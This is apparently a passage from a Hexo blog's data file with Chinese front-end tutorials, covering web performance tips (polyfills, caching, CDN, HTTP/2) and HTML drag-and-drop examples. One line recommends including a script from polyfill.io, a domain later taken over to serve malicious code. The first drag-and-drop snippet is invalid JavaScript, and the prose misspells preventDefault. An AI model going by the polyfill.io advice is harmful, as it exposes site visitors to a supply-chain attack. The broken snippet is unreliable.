的模块，都将打成一个单独的包，用于实现页面或组件的按需加载。</p>\n<h3 id=\"2-5-动态-polyfill\"><a href=\"#2-5-动态-polyfill\" class=\"headerlink\" title=\"2.5 动态 polyfill\"></a>2.5 动态 polyfill</h3><blockquote>\n<p>为了浏览器的兼容性，我们常常引入各种 polyfill，但是在构建时静态地引入 polyfill 存在一些问题，比如对于机型和浏览器版本比较新的用户来说，他们完全不需要 polyfill，引入 polyfill 对于这部分用户来说是多余的，从而造成体积变大和性能损失</p>\n</blockquote>\n<p>动态 polyfill 指的是根据不同的浏览器，动态载入需要的 polyfill。 Polyfill.io 通过尝试使用 polyfill 重新创建缺少的功能，可以更轻松地支持不同的浏览器，并且可以大幅度的减少构建体积。</p>\n<p>原理：根据你的浏览器 UA 头，判断你是否支持某些特性，从而返回给你一个合适的 polyfill。对于最新的 Chrome 浏览器来说，不需要任何 polyfill，所以返回的内容为空。如在 html 文件中引入 <code>&lt;script crossorigin=&quot;anonymous&quot; src=&quot;https://polyfill.io/v3/polyfill.js&quot;&gt;&lt;/script&gt;</code></p>\n<h2 id=\"三、HTTP-层面\"><a href=\"#三、HTTP-层面\" class=\"headerlink\" title=\"三、HTTP 层面\"></a>三、HTTP 层面</h2><h3 id=\"3-1-减少-HTTP-请求数\"><a href=\"#3-1-减少-HTTP-请求数\" class=\"headerlink\" title=\"3.1 减少 HTTP 请求数\"></a>3.1 减少 HTTP 请求数</h3><p>一个完整的 HTTP 请求需要经历 DNS 查找，TCP 握手，浏览器发出 HTTP 请求，服务器接收请求，服务器处理请求并发回响应，浏览器接收响应等过程，而如果文件较小，则真正下载数据的时间占比就越小，将多个小文件合并为一个大文件，从而减少 HTTP 请求次数，能提高此比例 </p>\n<ul>\n<li>每个请求都是有成本的，DNS寻址、与服务器建立连接、发送数据、等待服务器响应、接收数据复杂的过程。（使用缓存功能）</li>\n<li>每个请求都需要携带数据，每个请求都需要占用带宽（合并请求，如多个图片合并成一张大图）。</li>\n<li>浏览器进行并发请求的请求数是有上限的，因此请求数多了以后，浏览器需要分批进行请求，因此会增加用户的等待时间。（懒加载，只在必要的时机加载）</li>\n</ul>\n<h3 id=\"3-2-启用-gzip-压缩\"><a href=\"#3-2-启用-gzip-压缩\" class=\"headerlink\" title=\"3.2 启用 gzip 压缩\"></a>3.2 启用 gzip 压缩</h3><p>许多网络服务器可以通过调用第三方模块或使用内置程序将文件压缩为 gzip 格式，然后再发送该压缩文件以供下载。这样可以在下载呈现网站所需的资源时节省一些时间。</p>\n<blockquote>\n<p>Gzip通常将响应大小减少约 70％</p>\n</blockquote>\n<h3 id=\"3-3-改善服务器响应时间\"><a href=\"#3-3-改善服务器响应时间\" class=\"headerlink\" title=\"3.3 改善服务器响应时间\"></a>3.3 改善服务器响应时间</h3><p>将服务器响应时间控制在 200ms 以内。有很多潜在因素都可能会延缓服务器响应，例如应用逻辑缓慢、数据库查询缓慢、路由缓慢、框架、库、资源CPU不足或内存不足等。</p>\n<h3 id=\"3-4-使用-CDN-加速\"><a href=\"#3-4-使用-CDN-加速\" class=\"headerlink\" title=\"3.4 使用 CDN 加速\"></a>3.4 使用 CDN 加速</h3><p>可降低网络的拥塞状况、提高请求的响应速度，也能够减少源站的负载压力</p>\n<h3 id=\"3-5-合理的-HTTP-缓存策略\"><a href=\"#3-5-合理的-HTTP-缓存策略\" class=\"headerlink\" title=\"3.5 合理的 HTTP 缓存策略\"></a>3.5 合理的 HTTP 缓存策略</h3><p>尽可能利用缓存，对于文件名中有 hash 值时，设置强缓存，如设置 <code>cache-control: max-age=2592000</code> (1个月，或者半年、一年等)</p>\n<h3 id=\"3-6-域名分片、域名收敛\"><a href=\"#3-6-域名分片、域名收敛\" class=\"headerlink\" title=\"3.6 域名分片、域名收敛\"></a>3.6 域名分片、域名收敛</h3><p>域名分片：把页面资源拆分成多个域名进行访问，从而提高页面加载速度。原因在于 Web 浏览器会限制每个域名的并发数量，如 6 个（浏览器有并发限制，是为了防止 DDOS攻击），当并行下载文件超过最大并发数就需要排队等待，如果有多个域名，则每个域名都可以发起 6 个 HTTP 请求，提高并发量。另外，不同的域名也可以防止 cookie 污染。（PS: 主要运用于 PC 端）</p>\n<p>域名收敛：将静态资源放在一个域名下不进行发散，主要是为了适应移动端的发展需求，通常 DNS 是一个开销较大的操作，而移动端由于网络带宽和实时性、资源等的限制，这些开销对移动端的用户体验是致命的，因此需要进行域名收敛。（PS: 主要运用于移动端）</p>\n<h3 id=\"3-7-使用-HTTP2\"><a href=\"#3-7-使用-HTTP2\" class=\"headerlink\" title=\"3.7 使用 HTTP2\"></a>3.7 使用 HTTP2</h3><ul>\n<li>二进制分帧</li>\n<li>多路复用</li>\n<li>首部压缩</li>\n<li>流量控制</li>\n<li>…</li>\n</ul>\n<p>详细介绍可看下面的<strong>相关链接</strong>部分</p>\n<h2 id=\"相关链接\"><a href=\"#相关链接\" class=\"headerlink\" title=\"相关链接\"></a>相关链接</h2><ul>\n<li><a href=\"https://developer.mozilla.org/en-US/docs/Web/CSS/content-visibility\">content-visibility</a></li>\n<li><a href=\"https://developer.mozilla.org/zh-CN/docs/Web/API/Window/requestAnimationFrame\">window.requestAnimationFrame</a></li>\n<li><a href=\"https://juejin.cn/post/6844903982742110216\">高性能渲染十万条数据(虚拟列表)</a></li>\n<li><a href=\"https://juejin.cn/post/6844903873518239752\">CDN原理简析</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/26559480\">一文读懂 HTTP/2 特性</a></li>\n</ul>\n"},{"title":"拖放功能","date":"2021-05-24T08:32:28.000Z","_content":"\n# 拖放功能\n\n### 1、HTML5 拖放功能\n\n##### 1.1 说明\n* ondragstart 事件: 作用于被拖拽元素上，当拖拽元素开始被拖拽的时候触发（回调函数中可设置需要传递的数据）\n* ondragover 事件: 作用于目标元素上，拖拽元素在目标元素上移动时触发 （默认无法将元素 A 拖拽到元素 B 上，需调用 e.prentDefault() 方法，才能触发 ondrop 事件）\n* ondrop 事件：作用于目标元素上，被拖拽的元素在目标元素上且鼠标放开时触发 （drop事件的默认行为是以链接形式打开, 需调用 e.prentDefault() 方法，回调函数中可添加被拖拽元素作为子元素）\n* dataTransfer 对象：用于从被拖拽元素到目标元素间传递数据（拥有setData()、getData() 方法，只能传递字符串）\n\n##### 1.2 事件列表 \n\n在拖动目标上触发事件 (源元素):\n\n* ondragstart - 用户开始拖动元素时触发\n* ondrag - 元素正在拖动时触发\n* ondragend - 用户完成元素拖动\n\n释放目标时触发的事件:\n* ondragenter - 当被鼠标拖动的对象进入其容器范围内时触发此事件\n* ondragover - 当某被拖动的对象在另一对象容器范围内拖动时触发此事件\n* ondragleave - 当被鼠标拖动的对象离开其容器范围内时触发此事件\n* ondrop - 在一个拖动过程中，释放鼠标键时触发此事件\n\n\n##### 1.3 示例\n```html\n<div ondrop=\"drop(event)\" ondragover=\"allowDrop(event)\"></div>\n<img src=\"abc.gif\" draggable=\"true\" ondragstart=\"drag(event)\" />\n\n<script>\n    allowDrop(e) {\n        e.preventDefault();\n    }\n    drag(e) {\n        e.dataTransfer.setData(\"content\", '11111');\n    }\n    drop(e) {\n        e.preventDefault();\n        var data = e.dataTransfer.getData(\"content\");\n    }\n</script>\n```\n\n\n\n### 2、通过鼠标事件模拟拖放功能\n\n##### 2.1 实现步骤\n1. 监听被拖拽元素的 `onmousedown` 事件\n2. 在 `onmousedown` 事件事件触发时，保存**元素的左上角**与**鼠标点击的位置**的**修正偏移量**（`getBoundingClientRect()` 与 `event.clientX/clientY`）\n3. 设置被拖拽元素为 `position: absolute`，在之后位置改变时，会以文档左上角为标准，方便计算距离\n4. 在 `onmousedown` 中监听 `document` 元素的 `onmousemove` 事件（监听 `document` 会更可靠）\n5. 在 `onmousedown` 处理程序中，计算元素相对于文档的偏移量（`event.pageX/pageY` 与**修正偏移量**的差值）\n6. 设置被拖拽元素的 `top`、`left` 的值\n\n> mousemove 会经常被触发，但不会针对每个像素都如此。因此在快速移动之后，光标可以从文档中心的某个地方（甚至是窗口外）从球上跳出来。因此为了捕获它，我们应该监听 document。\n\n##### 2.2 示例\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">\n    <title>Document</title>\n    <style>\n        #app {\n            width: 1000px;\n            height: 550px;\n            margin: 0 auto;\n            border: 1px solid #ccc;\n        }\n        #content {\n            width: 800px;\n            height: 300px;\n            margin: 100px auto;\n            background: #eee;\n        }\n        #ball {\n            display: inline-block;\n            width: 40px;\n            height: 40px;\n            border-radius: 50%;\n            background: #900;\n            cursor: pointer;\n        }\n    </style>\n</head>\n<body>\n    <div id=\"app\">\n        <div id=\"content\" class=\"droppable\"></div>\n        <span id=\"ball\"></span>\n    </div>\n    <script>\n        let offset = null; // 鼠标点击的位置与元素左上角的偏移量\n        let currentDroppable = null;\n        const ball = document.querySelector('#ball');\n        const onmousemove = function(event) {\n          ball.style.left = event.pageX - offset.x + 'px';\n          ball.style.top = event.pageY - offset.y + 'px';\n\n          // 查找是否有目标元素\n          ball.style.display = 'none';\n          const belowEle = document.elementFromPoint(event.clientX, event.clientY);\n          ball.style.display = 'inline-block';\n          if (!belowEle) return;\n          \n          const droppableBelow = belowEle.closest('.droppable');\n          if (currentDroppable != droppableBelow) {\n            if (currentDroppable) {\n              ball.style.opacity = '1';\n            }\n\n            currentDroppable = droppableBelow;\n            if (currentDroppable) {\n              ball.style.opacity = '0.5';\n            }\n          }\n          \n          \n        }\n        \n        ball.addEventListener('mousedown', function(event) {\n          ball.style.position = 'absolute';\n          offset = {\n            x: event.clientX - ball.getBoundingClientRect().left,\n            y: event.clientY - ball.getBoundingClientRect().top\n          }\n          document.addEventListener('mousemove', onmousemove);\n        });\n        ball.addEventListener('mouseup', function(event) {\n          document.removeEventListener('mousemove', onmousemove);\n          ball.onmouseup = null;\n        });\n        ball.ondragstart = function() {\n          return false;\n        };\n    </script>\n</body>\n</html>\n```","source":"_posts/HTML/拖放功能.md","raw":"---\ntitle: 拖放功能\ncategories: HTML\ntags: [HTML]\ndate: 2021-05-24 16:32:28\n---\n\n# 拖放功能\n\n### 1、HTML5 拖放功能\n\n##### 1.1 说明\n* ondragstart 事件: 作用于被拖拽元素上，当拖拽元素开始被拖拽的时候触发（回调函数中可设置需要传递的数据）\n* ondragover 事件: 作用于目标元素上，拖拽元素在目标元素上移动时触发 （默认无法将元素 A 拖拽到元素 B 上，需调用 e.prentDefault() 方法，才能触发 ondrop 事件）\n* ondrop 事件：作用于目标元素上，被拖拽的元素在目标元素上且鼠标放开时触发 （drop事件的默认行为是以链接形式打开, 需调用 e.prentDefault() 方法，回调函数中可添加被拖拽元素作为子元素）\n* dataTransfer 对象：用于从被拖拽元素到目标元素间传递数据（拥有setData()、getData() 方法，只能传递字符串）\n\n##### 1.2 事件列表 \n\n在拖动目标上触发事件 (源元素):\n\n* ondragstart - 用户开始拖动元素时触发\n* ondrag - 元素正在拖动时触发\n* ondragend - 用户完成元素拖动\n\n释放目标时触发的事件:\n* ondragenter - 当被鼠标拖动的对象进入其容器范围内时触发此事件\n* ondragover - 当某被拖动的对象在另一对象容器范围内拖动时触发此事件\n* ondragleave - 当被鼠标拖动的对象离开其容器范围内时触发此事件\n* ondrop - 在一个拖动过程中，释放鼠标键时触发此事件\n\n\n##### 1.3 示例\n```html\n<div ondrop=\"drop(event)\" ondragover=\"allowDrop(event)\"></div>\n<img src=\"abc.gif\" draggable=\"true\" ondragstart=\"drag(event)\" />\n\n<script>\n    allowDrop(e) {\n        e.preventDefault();\n    }\n    drag(e) {\n        e.dataTransfer.setData(\"content\", '11111');\n    }\n    drop(e) {\n        e.preventDefault();\n        var data = e.dataTransfer.getData(\"content\");\n    }\n</script>\n```\n\n\n\n### 2、通过鼠标事件模拟拖放功能\n\n##### 2.1 实现步骤\n1. 监听被拖拽元素的 `onmousedown` 事件\n2. 在 `onmousedown` 事件事件触发时，保存**元素的左上角**与**鼠标点击的位置**的**修正偏移量**（`getBoundingClientRect()` 与 `event.clientX/clientY`）\n3. 设置被拖拽元素为 `position: absolute`，在之后位置改变时，会以文档左上角为标准，方便计算距离\n4. 在 `onmousedown` 中监听 `document` 元素的 `onmousemove` 事件（监听 `document` 会更可靠）\n5. 在 `onmousedown` 处理程序中，计算元素相对于文档的偏移量（`event.pageX/pageY` 与**修正偏移量**的差值）\n6. 设置被拖拽元素的 `top`、`left` 的值\n\n> mousemove 会经常被触发，但不会针对每个像素都如此。因此在快速移动之后，光标可以从文档中心的某个地方（甚至是窗口外）从球上跳出来。因此为了捕获它，我们应该监听 document。\n\n##### 2.2 示例\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">\n    <title>Document</title>\n    <style>\n        #app {\n            width: 1000px;\n            height: 550px;\n            margin: 0 auto;\n            border: 1px solid #ccc;\n        }\n        #content {\n            width: 800px;\n            height: 300px;\n            margin: 100px auto;\n            background: #eee;\n        }\n        #ball {\n            display: inline-block;\n            width: 40px;\n            height: 40px;\n            border-radius: 50%;\n            background: #900;\n            cursor: pointer;\n        }\n    </style>\n</head>\n<body>\n    <div id=\"app\">\n        <div id=\"content\" class=\"droppable\"></div>\n        <span id=\"ball\"></span>\n    </div>\n    <script>\n        let offset = null; // 鼠标点击的位置与元素左上角的偏移量\n        let currentDroppable = null;\n        const ball = document.querySelector('#ball');\n        const onmousemove = function(event) {\n          ball.style.left = event.pageX - offset.x + 'px';\n          ball.style.top = event.pageY - offset.y + 'px';\n\n          // 查找是否有目标元素\n          ball.style.display = 'none';\n          const belowEle = document.elementFromPoint(event.clientX, event.clientY);\n          ball.style.display = 'inline-block';\n          if (!belowEle) return;\n          \n          const droppableBelow = belowEle.closest('.droppable');\n          if (currentDroppable != droppableBelow) {\n            if (currentDroppable) {\n              ball.style.opacity = '1';\n            }\n\n            currentDroppable = droppableBelow;\n            if (currentDroppable) {\n              ball.style.opacity = '0.5';\n            }\n          }\n          \n          \n        }\n        \n        ball.addEventListener('mousedown', function(event) {\n          ball.style.position = 'absolute';\n          offset = {\n            x: event.clientX - ball.getBoundingClientRect().left,\n            y: event.clientY - ball.getBoundingClientRect().top\n          }\n          document.addEventListener('mousemove', onmousemove);\n        });\n        ball.addEventListener('mouseup', function(event) {\n          document.removeEventListener('mousemove', onmousemove);\n          ball.onmouseup = null;\n        });\n        ball.ondragstart = function() {\n          return false;\n        };\n    </script>\n</body>\n</html>\n```","slug":"HTML/拖放功能","published":1,"updated":"2021-06-07T11:40:36.023Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckpmjm7km00055g6rcvcagqk9","content":"<h1 id=\"拖放功能\"><a href=\"#拖放功能\" class=\"headerlink\" title=\"拖放功能\"></a>拖放功能</h1><h3 id=\"1、HTML5-拖放功能\"><a href=\"#1、HTML5-拖放功能\" class=\"headerlink\" title=\"1、HTML5 拖放功能\"></a>1、HTML5 拖放功能</h3><h5 id=\"1-1-说明\"><a href=\"#1-1-说明\" class=\"headerlink\" title=\"1.1 说明\"></a>1.1 说明</h5><ul>\n<li>ondragstart 事件: 作用于被拖拽元素上，当拖拽元素开始被拖拽的时候触发（回调函数中可设置需要传递的数据）</li>\n<li>ondragover 事件: 作用于目标元素上，拖拽元素在目标元素上移动时触发 （默认无法将元素 A 拖拽到元素 B 上，需调用 e.prentDefault() 方法，才能触发 ondrop 事件）</li>\n<li>ondrop 事件：作用于目标元素上，被拖拽的元素在目标元素上且鼠标放开时触发 （drop事件的默认行为是以链接形式打开, 需调用 e.prentDefault() 方法，回调函数中可添加被拖拽元素作为子元素）</li>\n<li>dataTransfer 对象：用于从被拖拽元素到目标元素间传递数据（拥有setData()、getData() 方法，只能传递字符串）</li>\n</ul>\n<h5 id=\"1-2-事件列表\"><a href=\"#1-2-事件列表\" class=\"headerlink\" title=\"1.2 事件列表\"></a>1.2 事件列表</h5><p>在拖动目标上触发事件 (源元素):</p>\n<ul>\n<li>ondragstart - 用户开始拖动元素时触发</li>\n<li>ondrag - 元素正在拖动时触发</li>\n<li>ondragend - 用户完成元素拖动</li>\n</ul>\n<p>释放目标时触发的事件:</p>\n<ul>\n<li>ondragenter - 当被鼠标拖动的对象进入其容器范围内时触发此事件</li>\n<li>ondragover - 当某被拖动的对象在另一对象容器范围内拖动时触发此事件</li>\n<li>ondragleave - 当被鼠标拖动的对象离开其容器范围内时触发此事件</li>\n<li>ondrop - 在一个拖动过程中，释放鼠标键时触发此事件</li>\n</ul>\n<h5 id=\"1-3-示例\"><a href=\"#1-3-示例\" class=\"headerlink\" title=\"1.3 示例\"></a>1.3 示例</h5><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">ondrop</span>=<span class=\"string\">&quot;drop(event)&quot;</span> <span class=\"attr\">ondragover</span>=<span class=\"string\">&quot;allowDrop(event)&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;abc.gif&quot;</span> <span class=\"attr\">draggable</span>=<span class=\"string\">&quot;true&quot;</span> <span class=\"attr\">ondragstart</span>=<span class=\"string\">&quot;drag(event)&quot;</span> /&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"function\"><span class=\"title\">allowDrop</span>(<span class=\"params\">e</span>)</span> &#123;</span></span><br><span class=\"line\">        e.preventDefault();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"function\"><span class=\"title\">drag</span>(<span class=\"params\">e</span>)</span> &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        e.dataTransfer.setData(<span class=\"string\">&quot;content&quot;</span>, <span class=\"string\">&#x27;11111&#x27;</span>);</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"function\"><span class=\"title\">drop</span>(<span class=\"params\">e</span>)</span> &#123;</span></span><br><span class=\"line\">        e.preventDefault();</span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">var</span> data = e.dataTransfer.getData(<span class=\"string\">&quot;content&quot;</span>);</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"2、通过鼠标事件模拟拖放功能\"><a href=\"#2、通过鼠标事件模拟拖放功能\" class=\"headerlink\" title=\"2、通过鼠标事件模拟拖放功能\"></a>2、通过鼠标事件模拟拖放功能</h3><h5 id=\"2-1-实现步骤\"><a href=\"#2-1-实现步骤\" class=\"headerlink\" title=\"2.1 实现步骤\"></a>2.1 实现步骤</h5><ol>\n<li>监听被拖拽元素的 <code>onmousedown</code> 事件</li>\n<li>在 <code>onmousedown</code> 事件事件触发时，保存<strong>元素的左上角</strong>与<strong>鼠标点击的位置</strong>的<strong>修正偏移量</strong>（<code>getBoundingClientRect()</code> 与 <code>event.clientX/clientY</code>）</li>\n<li>设置被拖拽元素为 <code>position: absolute</code>，在之后位置改变时，会以文档左上角为标准，方便计算距离</li>\n<li>在 <code>onmousedown</code> 中监听 <code>document</code> 元素的 <code>onmousemove</code> 事件（监听 <code>document</code> 会更可靠）</li>\n<li>在 <code>onmousedown</code> 处理程序中，计算元素相对于文档的偏移量（<code>event.pageX/pageY</code> 与<strong>修正偏移量</strong>的差值）</li>\n<li>设置被拖拽元素的 <code>top</code>、<code>left</code> 的值</li>\n</ol>\n<blockquote>\n<p>mousemove 会经常被触发，但不会针对每个像素都如此。因此在快速移动之后，光标可以从文档中心的某个地方（甚至是窗口外）从球上跳出来。因此为了捕获它，我们应该监听 document。</p>\n</blockquote>\n<h5 id=\"2-2-示例\"><a href=\"#2-2-示例\" class=\"headerlink\" title=\"2.2 示例\"></a>2.2 示例</h5><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">&quot;en&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;viewport&quot;</span> <span class=\"attr\">content</span>=<span class=\"string\">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">http-equiv</span>=<span class=\"string\">&quot;X-UA-Compatible&quot;</span> <span class=\"attr\">content</span>=<span class=\"string\">&quot;ie=edge&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>Document<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\">        #app &#123;</span><br><span class=\"line\"><span class=\"css\">            <span class=\"attribute\">width</span>: <span class=\"number\">1000px</span>;</span></span><br><span class=\"line\"><span class=\"css\">            <span class=\"attribute\">height</span>: <span class=\"number\">550px</span>;</span></span><br><span class=\"line\"><span class=\"css\">            <span class=\"attribute\">margin</span>: <span class=\"number\">0</span> auto;</span></span><br><span class=\"line\"><span class=\"css\">            <span class=\"attribute\">border</span>: <span class=\"number\">1px</span> solid <span class=\"number\">#ccc</span>;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        #content &#123;</span><br><span class=\"line\"><span class=\"css\">            <span class=\"attribute\">width</span>: <span class=\"number\">800px</span>;</span></span><br><span class=\"line\"><span class=\"css\">            <span class=\"attribute\">height</span>: <span class=\"number\">300px</span>;</span></span><br><span class=\"line\"><span class=\"css\">            <span class=\"attribute\">margin</span>: <span class=\"number\">100px</span> auto;</span></span><br><span class=\"line\"><span class=\"css\">            <span class=\"attribute\">background</span>: <span class=\"number\">#eee</span>;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        #ball &#123;</span><br><span class=\"line\"><span class=\"css\">            <span class=\"attribute\">display</span>: inline-block;</span></span><br><span class=\"line\"><span class=\"css\">            <span class=\"attribute\">width</span>: <span class=\"number\">40px</span>;</span></span><br><span class=\"line\"><span class=\"css\">            <span class=\"attribute\">height</span>: <span class=\"number\">40px</span>;</span></span><br><span class=\"line\"><span class=\"css\">            <span class=\"attribute\">border-radius</span>: <span class=\"number\">50%</span>;</span></span><br><span class=\"line\"><span class=\"css\">            <span class=\"attribute\">background</span>: <span class=\"number\">#900</span>;</span></span><br><span class=\"line\"><span class=\"css\">            <span class=\"attribute\">cursor</span>: pointer;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;app&quot;</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;content&quot;</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;droppable&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">span</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;ball&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> offset = <span class=\"literal\">null</span>; <span class=\"comment\">// 鼠标点击的位置与元素左上角的偏移量</span></span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> currentDroppable = <span class=\"literal\">null</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">const</span> ball = <span class=\"built_in\">document</span>.querySelector(<span class=\"string\">&#x27;#ball&#x27;</span>);</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">const</span> onmousemove = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">event</span>) </span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">          ball.style.left = event.pageX - offset.x + <span class=\"string\">&#x27;px&#x27;</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">          ball.style.top = event.pageY - offset.y + <span class=\"string\">&#x27;px&#x27;</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">          <span class=\"comment\">// 查找是否有目标元素</span></span></span><br><span class=\"line\"><span class=\"javascript\">          ball.style.display = <span class=\"string\">&#x27;none&#x27;</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">          <span class=\"keyword\">const</span> belowEle = <span class=\"built_in\">document</span>.elementFromPoint(event.clientX, event.clientY);</span></span><br><span class=\"line\"><span class=\"javascript\">          ball.style.display = <span class=\"string\">&#x27;inline-block&#x27;</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">          <span class=\"keyword\">if</span> (!belowEle) <span class=\"keyword\">return</span>;</span></span><br><span class=\"line\">          </span><br><span class=\"line\"><span class=\"javascript\">          <span class=\"keyword\">const</span> droppableBelow = belowEle.closest(<span class=\"string\">&#x27;.droppable&#x27;</span>);</span></span><br><span class=\"line\">          if (currentDroppable != droppableBelow) &#123;</span><br><span class=\"line\">            if (currentDroppable) &#123;</span><br><span class=\"line\"><span class=\"javascript\">              ball.style.opacity = <span class=\"string\">&#x27;1&#x27;</span>;</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            currentDroppable = droppableBelow;</span><br><span class=\"line\">            if (currentDroppable) &#123;</span><br><span class=\"line\"><span 